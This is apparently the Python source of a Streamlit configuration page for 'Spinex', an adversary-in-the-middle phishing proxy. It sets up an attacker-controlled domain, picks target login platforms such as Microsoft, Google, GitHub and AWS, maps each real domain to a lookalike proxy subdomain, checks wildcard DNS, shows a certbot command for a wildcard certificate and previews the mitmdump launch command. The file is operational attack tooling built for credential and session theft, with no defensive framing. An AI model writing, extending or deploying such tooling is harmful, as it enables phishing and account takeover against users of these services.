"""
config_page.py — Spinex AiTM Configuration Page

Drop this file into your Streamlit pages/ directory, or call render() from app.py.
Requires:  pip install streamlit
"""

import streamlit as st
import socket
import os
import sys

# Allow import from parent directory when run as a page
_AITM_DIR = os.path.dirname(os.path.abspath(__file__))
if _AITM_DIR not in sys.path:
    sys.path.insert(0, _AITM_DIR)
import config_manager as cm

_CSS = """
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;700;800&display=swap');

:root {
    --bg:        #0a0a0f;
    --surface:   #111118;
    --border:    #1e1e2e;
    --accent:    #00ff9d;
    --accent2:   #ff3c6e;
    --accent3:   #7c5cff;
    --text:      #e2e2f0;
    --muted:     #6b6b8a;
    --ok:        #00ff9d;
    --warn:      #ffcc00;
    --fail:      #ff3c6e;
}

html, body, [data-testid="stAppViewContainer"] {
    background: var(--bg) !important;
    font-family: 'Syne', sans-serif;
    color: var(--text);
}

[data-testid="stSidebar"] { background: var(--surface) !important; }

h1, h2, h3 { font-family: 'Syne', sans-serif; font-weight: 800; letter-spacing: -0.03em; }
code, pre, .mono { font-family: 'JetBrains Mono', monospace; }

/* Section cards */
.spinex-card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 1.5rem;
    margin-bottom: 1rem;
}
.spinex-card-title {
    font-size: 0.7rem;
    font-weight: 700;
    letter-spacing: 0.15em;
    text-transform: uppercase;
    color: var(--muted);
    margin-bottom: 1rem;
}

/* Status badges */
.badge {
    display: inline-block;
    padding: 2px 10px;
    border-radius: 100px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.72rem;
    font-weight: 600;
    letter-spacing: 0.05em;
}
.badge-ok   { background: #00ff9d18; color: var(--ok);  border: 1px solid #00ff9d44; }
.badge-warn { background: #ffcc0018; color: var(--warn); border: 1px solid #ffcc0044; }
.badge-fail { background: #ff3c6e18; color: var(--fail); border: 1px solid #ff3c6e44; }

/* Domain map table */
.dm-table { width: 100%; border-collapse: collapse; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; }
.dm-table th { color: var(--muted); font-weight: 600; text-align: left; padding: 6px 12px; border-bottom: 1px solid var(--border); }
.dm-table td { padding: 6px 12px; border-bottom: 1px solid #1a1a28; }
.dm-table td.real  { color: var(--muted); }
.dm-table td.arrow { color: var(--accent3); padding: 0 4px; }
.dm-table td.proxy { color: var(--accent); }

/* DNS check rows */
.dns-row { display: flex; align-items: center; gap: 12px; padding: 6px 0; font-family: 'JetBrains Mono', monospace; font-size: 0.82rem; border-bottom: 1px solid var(--border); }
.dns-domain { flex: 1; color: var(--text); }
.dns-resolved { color: var(--muted); font-size: 0.75rem; }

/* Accent header line */
.accent-line { width: 40px; height: 3px; background: var(--accent); border-radius: 2px; margin-bottom: 0.5rem; }
</style>
"""

PLATFORM_META = {
    "microsoft": {"icon": "🪟", "label": "Microsoft / O365"},
    "google":    {"icon": "🔵", "label": "Google / Gmail"},
    "instagram": {"icon": "📸", "label": "Instagram"},
    "facebook":  {"icon": "👤", "label": "Facebook"},
    "linkedin":  {"icon": "💼", "label": "LinkedIn"},
    "twitter":   {"icon": "𝕏",  "label": "Twitter / X"},
    "github":    {"icon": "🐙", "label": "GitHub"},
    "aws":       {"icon": "☁️", "label": "AWS Console"},
}


def _badge(text: str, kind: str) -> str:
    return f'<span class="badge badge-{kind}">{text}</span>'


def _render_domain_map(domain_map: dict) -> None:
    if not domain_map:
        st.markdown(
            '<p style="color:var(--muted);font-size:0.85rem;">Enable at least one platform and enter a base domain to preview.</p>',
            unsafe_allow_html=True,
        )
        return

    rows = "".join(
        f'<tr>'
        f'<td class="real">{real}</td>'
        f'<td class="arrow">→</td>'
        f'<td class="proxy">{proxy}</td>'
        f'</tr>'
        for real, proxy in sorted(domain_map.items())
    )
    st.markdown(
        f'<table class="dm-table">'
        f'<thead><tr><th>Real domain</th><th></th><th>Your proxy domain</th></tr></thead>'
        f'<tbody>{rows}</tbody>'
        f'</table>',
        unsafe_allow_html=True,
    )


def _render_dns_results(results: dict) -> None:
    if not results:
        st.info("No subdomains to check. Configure a domain and enable platforms first.")
        return

    for domain, res in sorted(results.items()):
        if res["error"]:
            badge = _badge("NOT RESOLVING", "fail")
            resolved_text = f'error: {res["error"]}'
        elif res["ok"]:
            badge = _badge("OK", "ok")
            resolved_text = f'→ {res["resolved"]}'
        else:
            badge = _badge("WRONG IP", "warn")
            resolved_text = f'→ {res["resolved"]} (expected {res["expected"]})'

        st.markdown(
            f'<div class="dns-row">'
            f'{badge}'
            f'<span class="dns-domain">{domain}</span>'
            f'<span class="dns-resolved">{resolved_text}</span>'
            f'</div>',
            unsafe_allow_html=True,
        )

def render() -> None:
    st.markdown(_CSS, unsafe_allow_html=True)

    # Header
    st.markdown('<div class="accent-line"></div>', unsafe_allow_html=True)
    st.markdown("# AiTM Configuration")
    st.markdown(
        '<p style="color:var(--muted);margin-top:-0.5rem;">Configure your proxy domain, platforms, and TLS certificate.</p>',
        unsafe_allow_html=True,
    )
    st.divider()

    # Load current config
    cfg = cm.load()

    st.markdown("### 🌐 Domain & Server")
    col1, col2 = st.columns(2)

    with col1:
        base_domain = st.text_input(
            "Base domain",
            value=cfg["domain"]["base"],
            placeholder="evil-portal.com",
            help="Your attacker-controlled domain. Do not include http:// or www.",
        )
        acme_email = st.text_input(
            "ACME email",
            value=cfg["domain"]["acme_email"],
            placeholder="you@protonmail.com",
            help="Used by Let's Encrypt to issue your wildcard TLS certificate.",
        )

    with col2:
        server_ip = st.text_input(
            "Server IP",
            value=cfg["domain"]["server_ip"],
            placeholder="1.2.3.4",
            help="Public IP of your proxy server. Your DNS wildcard record must point here.",
        )
        proxy_port = st.number_input(
            "Proxy port",
            min_value=1,
            max_value=65535,
            value=int(cfg["proxy"].get("port", 443)),
            help="Port mitmproxy listens on. Use 443 for production.",
        )

    st.divider()

    st.markdown("### 🎯 Target Platforms")
    st.markdown(
        '<p style="color:var(--muted);font-size:0.85rem;margin-top:-0.5rem;">'
        'Enable the platforms you want to proxy. Each gets its own subdomain.</p>',
        unsafe_allow_html=True,
    )

    platforms = dict(cfg["platforms"])
    cols = st.columns(4)
    platform_keys = list(PLATFORM_META.keys())

    for i, key in enumerate(platform_keys):
        meta = PLATFORM_META[key]
        with cols[i % 4]:
            platforms[key] = st.checkbox(
                f"{meta['icon']} {meta['label']}",
                value=platforms.get(key, False),
                key=f"platform_{key}",
            )

    st.divider()

    with st.expander("🔐 Certificate paths (optional — leave blank to use Let's Encrypt defaults)"):
        cert_path = st.text_input(
            "Certificate path (.pem)",
            value=cfg["proxy"].get("cert_path", ""),
            placeholder=f"/etc/letsencrypt/live/{base_domain or 'yourdomain.com'}/fullchain.pem",
        )
        key_path = st.text_input(
            "Private key path (.pem)",
            value=cfg["proxy"].get("key_path", ""),
            placeholder=f"/etc/letsencrypt/live/{base_domain or 'yourdomain.com'}/privkey.pem",
        )

    st.divider()

    preview_cfg = cm._merge_defaults({
        "domain":    {"base": base_domain, "server_ip": server_ip, "acme_email": acme_email},
        "platforms": platforms,
        "proxy":     {"port": proxy_port, "cert_path": cert_path, "key_path": key_path},
    }, cm.DEFAULT_CONFIG)

    st.markdown("### 🗺️ Generated Domain Map")
    st.markdown(
        '<p style="color:var(--muted);font-size:0.85rem;margin-top:-0.5rem;">'
        'Auto-generated from your base domain and enabled platforms. '
        'These are the domains your DNS wildcard record must cover.</p>',
        unsafe_allow_html=True,
    )
    domain_map = cm.generate_domain_map(preview_cfg)
    _render_domain_map(domain_map)

    st.divider()

    st.markdown("### 📡 DNS Check")
    st.markdown(
        '<p style="color:var(--muted);font-size:0.85rem;margin-top:-0.5rem;">'
        'Verify your wildcard DNS record is live and pointing at your server.</p>',
        unsafe_allow_html=True,
    )

    if st.button("Run DNS check", type="secondary"):
        errors = cm.validate(preview_cfg)
        if errors:
            for e in errors:
                st.error(e)
        else:
            with st.spinner("Resolving subdomains…"):
                dns_results = cm.check_dns(preview_cfg)
            _render_dns_results(dns_results)

            all_ok = all(r["ok"] for r in dns_results.values())
            if all_ok:
                st.success("All subdomains resolve correctly. DNS is ready.")
            else:
                st.warning("Some subdomains are not resolving correctly. Fix DNS before fetching certs.")

    st.divider()

    st.markdown("### 🔒 TLS Certificate")
    cert_ok = cm.cert_exists(preview_cfg)
    cert_p, key_p = cm.get_cert_paths(preview_cfg)

    col_cert1, col_cert2 = st.columns([3, 1])
    with col_cert1:
        st.markdown(
            f'<p style="font-family:\'JetBrains Mono\',monospace;font-size:0.82rem;color:var(--muted);">'
            f'cert: {cert_p or "not configured"}<br>'
            f'key:  {key_p  or "not configured"}</p>',
            unsafe_allow_html=True,
        )
    with col_cert2:
        if cert_ok:
            st.markdown(_badge("CERT FOUND", "ok"), unsafe_allow_html=True)
        else:
            st.markdown(_badge("NOT FOUND", "fail"), unsafe_allow_html=True)

    if not cert_ok:
        st.markdown(
            f"""
<div style="background:#111118;border:1px solid #1e1e2e;border-radius:6px;padding:1rem;margin-top:0.5rem;">
<p style="color:var(--muted);font-size:0.8rem;margin:0 0 0.5rem;">Run on your proxy server to get a wildcard cert:</p>
<pre style="color:#00ff9d;font-size:0.8rem;margin:0;">certbot certonly \\
  --dns-cloudflare \\
  --dns-cloudflare-credentials ~/.secrets/cloudflare.ini \\
  -d "{base_domain or 'yourdomain.com'}" \\
  -d "*.{base_domain or 'yourdomain.com'}"</pre>
</div>""",
            unsafe_allow_html=True,
        )

    st.divider()

    col_save1, col_save2 = st.columns([1, 3])
    with col_save1:
        if st.button("💾 Save configuration", type="primary", use_container_width=True):
            errors = cm.validate(preview_cfg)
            if errors:
                for e in errors:
                    st.error(e)
            else:
                cm.save(preview_cfg)
                st.success("Configuration saved to spinex_config.json")
                st.rerun()

    with col_save2:
        if cfg["meta"].get("last_modified"):
            st.markdown(
                f'<p style="color:var(--muted);font-size:0.78rem;padding-top:0.6rem;">'
                f'Last saved: {cfg["meta"]["last_modified"]}</p>',
                unsafe_allow_html=True,
            )

    if base_domain and server_ip:
        with st.expander("⚡ mitmdump launch command (preview)"):
            cmd = cm.build_mitmproxy_cmd(preview_cfg)
            st.code(" ".join(cmd), language="bash")
            st.caption("This command will be run automatically by the proxy launcher in Phase 3.")

if __name__ == "__main__":
    st.set_page_config(
        page_title="Spinex — AiTM Config",
        page_icon="🕸️",
        layout="wide",
        initial_sidebar_state="collapsed",
    )
    render()